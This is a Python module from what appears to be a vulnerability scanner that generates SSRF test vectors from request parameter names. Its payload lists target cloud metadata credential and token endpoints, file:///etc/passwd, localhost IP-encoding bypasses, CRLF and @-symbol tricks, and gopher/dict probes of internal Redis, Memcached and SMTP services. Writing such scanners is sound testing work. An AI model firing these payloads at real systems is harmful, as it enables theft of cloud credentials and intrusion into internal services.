

from collections.abc import Collection, Iterable
from dataclasses import dataclass, field
import re

from aiva_common.schemas import FunctionTaskPayload
from aiva_common.utils import get_logger
from .dns_rebinding_detector import DnsRebindingDetector

logger = get_logger(__name__)

OAST_PLACEHOLDER = "{oast}"  # Placeholder replaced with dispatcher callback URL.


@dataclass
class SsrfTestVector:
    payload: str
    description: str
    requires_oast: bool = False
    location: str | None = None
    parameter: str | None = None
    follow_redirects: bool = True


@dataclass
class AnalysisPlan:
    vectors: list[SsrfTestVector] = field(default_factory=list)


class ParamSemanticsAnalyzer:
    """Inspect task metadata and derive SSRF payload candidates."""

    _REDIRECT_KEYWORDS = {
        "url",
        "target",
        "dest",
        "redirect",
        "next",
        "return",
        "callback",
        "webhook",
        "forward",
        "continue",
    }

    _FILE_KEYWORDS = {"file", "path", "template", "config"}
    _PROTOCOL_KEYWORDS = {"gopher", "smb", "ftp", "dict", "ldap"}

    # Standard SSRF payloads
    _DEFAULT_PAYLOADS = [
        # AWS metadata
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        # Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # 阿里雲 metadata
        "http://100.100.100.200/latest/meta-data/",
        # 騰訊雲 metadata
        "http://metadata.tencentyun.com/latest/meta-data/",
        # Localhost variations
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
    ]
    
    # Protocol bypass techniques - IP encoding variations
    _IP_BYPASS_PAYLOADS = [
        # Decimal IP (127.0.0.1 = 2130706433)
        "http://2130706433/",
        # Hex IP
        "http://0x7f.0x0.0x0.0x1/",
        # Octal IP
        "http://0177.0000.0000.0001/",
        # Mixed encoding
        "http://127.1/",
        "http://127.0.1/",
        # IPv6 variations
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        # DNS rebinding preparation
        "http://localtest.me/",  # resolves to 127.0.0.1
        "http://127.0.0.1.nip.io/",
        # URL encoding bypasses
        "http://127.0.0.1%00.example.com/",
        "http://127.0.0.1%2f.example.com/",
        # CRLF injection
        "http://example.com%0d%0a%0d%0aGET%20http://169.254.169.254/",
        # @ symbol bypass
        "http://example.com@127.0.0.1/",
        "http://127.0.0.1@example.com/",
        # Rare protocols for internal services
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:11211/stats",
    ]

    _FILE_PAYLOADS = ["file:///etc/passwd", "file:///c:/windows/win.ini"]
    _PROTOCOL_PAYLOADS = [
        "gopher://127.0.0.1:6379/_HELLO",
        "dict://127.0.0.1:11211/info",
    ]

    # Additional cross-protocol payloads (opt-in via test_config or header)
    # Cloud metadata endpoints (comprehensive)
    _CLOUD_METADATA_ENDPOINTS = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.170.2/v2/credentials",  # ECS task metadata endpoint v2
            "http://169.254.170.2/v2/metadata",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata/computeMetadata/v1/",  # Short form
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/instance-id",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        ],
        "tencent": [
            "http://metadata.tencentyun.com/latest/meta-data/",
            "http://metadata.tencentyun.com/latest/meta-data/instance-id",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
        ],
        "oracle": [
            "http://169.254.169.254/opc/v1/instance/",
        ],
    }
    
    _CROSS_PROTOCOL_PAYLOAD_MAP: dict[str, list[str]] = {
        "gopher": [
            "gopher://127.0.0.1:11211/_stats",  # Memcached
            "gopher://127.0.0.1:25/_VRFY%20root",  # SMTP
            "gopher://127.0.0.1:6379/_INFO",  # Redis
            "gopher://127.0.0.1:3306/_",  # MySQL
            "gopher://127.0.0.1:9200/_",  # Elasticsearch
        ],
        "ftp": [
            "ftp://127.0.0.1:21/",
            "ftp://admin:admin@127.0.0.1/",
        ],
        "dict": [
            "dict://127.0.0.1:11211/info",
            "dict://127.0.0.1:6379/INFO",
        ],
        "ldap": [
            "ldap://127.0.0.1:389/",
            "ldaps://127.0.0.1:636/",
        ],
        "smb": [
            "smb://127.0.0.1/share",
        ],
        "tftp": [
            "tftp://127.0.0.1:69/",
        ],
    }

    def analyze(self, task: FunctionTaskPayload) -> AnalysisPlan:
        """Coordinator: build SSRF test plan from task semantics."""
        parameter = (task.target.parameter or "").strip()
        location = (task.target.parameter_location or "query").lower()
        tokens = self._tokenize(parameter)
        plan = AnalysisPlan()
        
        # Phase 1: Build base payloads
        payloads = self._get_base_payloads(task)
        
        # Phase 2: Add standard SSRF vectors
        self._add_standard_vectors(plan, payloads, location, parameter)
        
        # Phase 3: Add semantic-based vectors
        self._add_semantic_vectors(plan, tokens, location, parameter)
        
        # Phase 4: Add cross-protocol vectors
        self._add_cross_protocol_vectors(plan, task, location, parameter)
        
        # Phase 5: Add OAST vector if enabled
        self._add_oast_vector(plan, tokens, task, location, parameter)
        
        return plan

    def _get_base_payloads(self, task: FunctionTaskPayload) -> list[str]:
        """Get base payloads with advanced/DNS extensions."""
        payloads = list(self._build_payloads(task))
        if not payloads:
            payloads = list(self._DEFAULT_PAYLOADS)
        
        test_config = task.test_config
        if test_config and test_config.payloads:
            requested = {p.strip().lower() for p in test_config.payloads}
            payloads.extend(self._get_advanced_payloads(requested, task))
        
        return payloads

    def _get_advanced_payloads(self, requested: set[str], task: FunctionTaskPayload) -> list[str]:
        """Get advanced payloads (IP bypass, DNS rebinding)."""
        advanced = []
        
        if "advanced" in requested or "bypass" in requested:
            advanced.extend(self._IP_BYPASS_PAYLOADS)
        
        if "dns-rebinding" in requested or "rebinding" in requested:
            dns_detector = DnsRebindingDetector()
            dns_payloads = dns_detector.generate_payloads(
                internal_targets=["127.0.0.1", "169.254.169.254"]
            )
            advanced.extend(dns_payloads)
            logger.info(
                f"Added {len(dns_payloads)} DNS rebinding payloads",
                extra={"task_id": task.task_id}
            )
        
        return advanced

    def _add_standard_vectors(
        self, plan: AnalysisPlan, payloads: list[str], location: str, parameter: str
    ) -> None:
        """Add standard SSRF probe vectors."""
        for payload in payloads:
            plan.vectors.append(
                SsrfTestVector(
                    payload=payload,
                    description="Standard SSRF probe",
                    location=location,
                    parameter=parameter or None,
                )
            )

    def _add_semantic_vectors(
        self, plan: AnalysisPlan, tokens: set[str], location: str, parameter: str
    ) -> None:
        """Add vectors based on parameter semantics."""
        if self._REDIRECT_KEYWORDS & tokens:
            plan.vectors.append(
                SsrfTestVector(
                    payload="http://evil.example/redirect",
                    description="Open redirect verification",
                    location=location,
                    parameter=parameter or None,
                )
            )
        
        if self._FILE_KEYWORDS & tokens:
            self._add_file_vectors(plan, location, parameter)
        
        if self._PROTOCOL_KEYWORDS & tokens:
            self._add_protocol_vectors(plan, location, parameter)

    def _add_file_vectors(self, plan: AnalysisPlan, location: str, parameter: str) -> None:
        """Add file:// scheme vectors."""
        for payload in self._FILE_PAYLOADS:
            plan.vectors.append(
                SsrfTestVector(
                    payload=payload,
                    description="File scheme probing",
                    location=location,
                    parameter=parameter or None,
                    follow_redirects=False,
                )
            )

    def _add_protocol_vectors(self, plan: AnalysisPlan, location: str, parameter: str) -> None:
        """Add alternate protocol vectors."""
        for payload in self._PROTOCOL_PAYLOADS:
            plan.vectors.append(
                SsrfTestVector(
                    payload=payload,
                    description="Alternate protocol probing",
                    location=location,
                    parameter=parameter or None,
                    follow_redirects=False,
                )
            )

    def _add_cross_protocol_vectors(
        self, plan: AnalysisPlan, task: FunctionTaskPayload, location: str, parameter: str
    ) -> None:
        """Add cross-protocol vectors based on configuration."""
        selected_protocols = self._get_selected_protocols(task)
        
        for proto in selected_protocols:
            for payload in self._CROSS_PROTOCOL_PAYLOAD_MAP.get(proto, []):
                plan.vectors.append(
                    SsrfTestVector(
                        payload=payload,
                        description=f"Cross-protocol probing ({proto})",
                        location=location,
                        parameter=parameter or None,
                        follow_redirects=False,
                    )
                )

    def _get_selected_protocols(self, task: FunctionTaskPayload) -> set[str]:
        """Determine which cross-protocol vectors to include."""
        requested = {p.strip().lower() for p in (task.test_config.payloads or [])}
        headers = task.target.headers or {}
        protocols_hdr = headers.get("X-SSRF-Protocols")
        
        if protocols_hdr:
            return {p.strip().lower() for p in protocols_hdr.split(",") if p.strip()}
        
        if {"cross", "advanced"} & requested:
            return {"gopher", "ftp", "dict"}
        
        return set()

    def _add_oast_vector(
        self, plan: AnalysisPlan, tokens: set[str], task: FunctionTaskPayload, location: str, parameter: str
    ) -> None:
        """Add OAST vector if enabled."""
        if self._should_enable_oast(tokens, task):
            plan.vectors.append(
                SsrfTestVector(
                    payload=f"{OAST_PLACEHOLDER}/ssrf",
                    description="Out-of-band callback validation",
                    location=location,
                    parameter=parameter or None,
                    requires_oast=True,
                )
            )

    def _build_payloads(self, task: FunctionTaskPayload) -> Iterable[str]:
        seen = set()

        for payload in task.custom_payloads or []:
            normalized = payload.strip()
            if normalized and normalized not in seen:
                seen.add(normalized)
                yield normalized

        for payload in task.test_config.custom_payloads or []:
            normalized = payload.strip()
            if normalized and normalized not in seen:
                seen.add(normalized)
                yield normalized

        for payload in task.test_config.payloads:
            normalized = payload.strip()
            if normalized and normalized.lower() == "basic":
                continue
            if normalized and normalized not in seen:
                seen.add(normalized)
                yield normalized

        for payload in self._DEFAULT_PAYLOADS:
            if payload not in seen:
                seen.add(payload)
                yield payload

    def _should_enable_oast(
        self, tokens: Collection[str], task: FunctionTaskPayload
    ) -> bool:
        token_set = set(tokens)
        if {"callback", "webhook"} & token_set:
            return True
        if {"notify", "ping"} & token_set:
            return True
        payload_sources: list[str] = []
        if task.custom_payloads:
            payload_sources.extend(task.custom_payloads)
        payload_sources.extend(task.test_config.custom_payloads or [])
        if payload_sources:
            return any(OAST_PLACEHOLDER in payload for payload in payload_sources)
        return False

    def _tokenize(self, parameter: str) -> set[str]:
        if not parameter:
            return set()
        normalized = re.sub(r"([A-Z])", r"_\1", parameter).lower()
        parts = re.split(r"[^a-z0-9]+", normalized)
        return {part for part in parts if part}
